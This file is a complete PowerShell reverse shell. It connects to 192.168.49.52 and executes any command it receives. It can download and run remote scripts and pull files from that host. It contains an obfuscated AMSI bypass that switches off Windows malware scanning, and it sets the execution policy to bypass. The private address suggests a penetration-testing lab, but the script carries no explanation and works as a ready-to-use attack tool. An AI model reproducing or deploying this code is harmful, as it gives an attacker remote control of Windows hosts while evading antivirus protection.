$client = New-Object Net.Sockets.TCPClient('192.168.49.52',80)
$uploads = 'http://192.168.49.52:443/'
$streamreader = $client.GetStream()
$streamwriter = New-Object System.IO.StreamWriter($streamreader)

function WriteStream ($String) {
  [byte[]]$script:Buffer = 0..$client.ReceiveBufferSize | % {0}
  $wd = pwd
  $user = whoami
  $streamwriter.Write($String + '[' + $user + ' ' + $wd + ']' + '$ ' )
  $streamwriter.Flush()
}

function Import($filename) {
  return ([System.Net.WebClient]::new().DownloadString($uploads + $filename))  
  }

function Upload($filename, $filepath) {
  $downfile = $uploads + $filename
  invoke-webrequest $downfile -usebasicparsing -outfile $filepath 

}

$asm = [Ref].aSSemBLy.gETtypEs()
$match1 = 'aM*l*s'
$match2 = '*aILeD*'
$field1 = 'nOnPuBlIc'
$field2 = 'sTaTiC'
$n = $NULL
$t = $TRUE
($asm | % {if ($_.Name -like $match1) {$_.GetFields($field1+','+$field2) | ? {$_.Name -like '*ail*d*'}}}).SetValue($n, $t)

set-executionpolicy bypass -scope currentuser

$ProgressPreference = 'SilentlyContinue'

WriteStream ''

while(($BytesRead = $streamreader.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
  $command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
  
  $subcommands = $command.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)
  switch ($subcommands[0]) {
    'import' { $script = Import $subcommands[1]; iex $script; $output = 'Imported ' + $subcommands[1] + "`n"; break }
    'upload' { upload $subcommands[1] $subcommands[2]; $output = 'Uploaded ' + $subcommands[1] + 'to ' + $subcommands[2]; break}
    default { $output = try { iex $command 2>&1 | out-string } catch { $_ | out-string }}
  }

  WriteStream ($Output)

}
$StreamWriter.Close()
